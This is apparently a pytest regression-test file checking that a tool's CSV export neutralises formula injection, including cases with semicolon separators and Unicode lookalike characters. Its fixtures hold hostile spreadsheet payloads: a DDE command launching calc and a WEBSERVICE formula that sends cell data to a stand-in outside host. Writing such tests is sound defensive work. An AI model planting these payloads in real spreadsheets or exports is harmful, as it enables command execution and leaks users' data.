"""Regression tests for the findings of the second adversarial security review.

Each section is named after the finding it covers. Every test here fails when the
fix for its finding is removed.
"""

from __future__ import annotations

import csv
import io
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest

from regwatch.cli import main
from regwatch.export import RECORD_COLUMNS, neutralise_cell, records_csv

FORMULA_CHARS = ("=", "+", "-", "@", "\t", "\r", "\n")

# --- rw-01 and rw-14: csv injection through semicolons and lookalike characters ---------


def _fields_starting_with_formula(text: str, delimiter: str) -> list[str]:
    rows = list(csv.reader(io.StringIO(text), delimiter=delimiter))
    return [cell for row in rows for cell in row if cell[:1] in FORMULA_CHARS]


def test_export_is_safe_when_a_spreadsheet_splits_on_semicolons(
    project: Path,
    edit_json: Callable[[Path, Callable[[Any], None]], None],
    tmp_path: Path,
) -> None:
    def hostile(data: Any) -> None:
        data["topics_vocabulary"] += ["safe", "=cmd|' /C calc'!A0"]
        entry = data["detail"]["nl-allergen-order"]
        entry["summary"] = "x;=1+1;y"
        entry["impacts"] = 'see note;=WEBSERVICE("https://tracker.example/?"&A2);end'
        entry["topics"] = ["safe", "=cmd|' /C calc'!A0"]

    edit_json(project.parent / "register" / "detail.json", hostile)
    out = tmp_path / "out.csv"
    assert main(["--config", str(project), "export", "--csv", str(out)]) == 0
    text = out.read_text(encoding="utf-8")
    assert "=1+1" in text
    for delimiter in (",", ";"):
        assert _fields_starting_with_formula(text, delimiter) == [], delimiter
    # The text that follows a semicolon inside a field is neutralised as well.
    [row] = [
        r for r in csv.DictReader(io.StringIO(text)) if r["obligation_id"] == "nl-allergen-order"
    ]
    assert row["summary"] == "x;'=1+1;y"
    assert row["topics"] == "safe;'=cmd|' /C calc'!A0"


def test_every_csv_field_is_quoted() -> None:
    row = {column: "plain" for column in RECORD_COLUMNS}
    text = records_csv([row])
    for line in text.splitlines():
        assert line.startswith('"') and line.endswith('"')


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (" =1", "' =1"),
        ("\xa0=1", "'\xa0=1"),
        ("\u200b=1", "'\u200b=1"),
        ("\n=1", "'\n'=1"),
        ("\uff1d1", "'\uff1d1"),
        ("\uff0b1", "'\uff0b1"),
        ("\uff0d1", "'\uff0d1"),
        ("\uff20x", "'\uff20x"),
        ("a;=1", "a;'=1"),
        ("a,=1", "a,'=1"),
        ("a;  @x", "a;'  @x"),
        ("a\t=1", "a\t'=1"),
        ("a\n+1", "a\n'+1"),
        ("a;\u200b-1", "a;'\u200b-1"),
    ],
)
def test_neutralise_cell_covers_separators_whitespace_and_lookalikes(
    value: str, expected: str
) -> None:
    assert neutralise_cell(value) == expected


@pytest.mark.parametrize("value", ["a=b", "a;b=c", "1-2", "a, b", "x@y", "plain", ""])
def test_neutralise_cell_leaves_ordinary_text_alone(value: str) -> None:
    assert neutralise_cell(value) == value
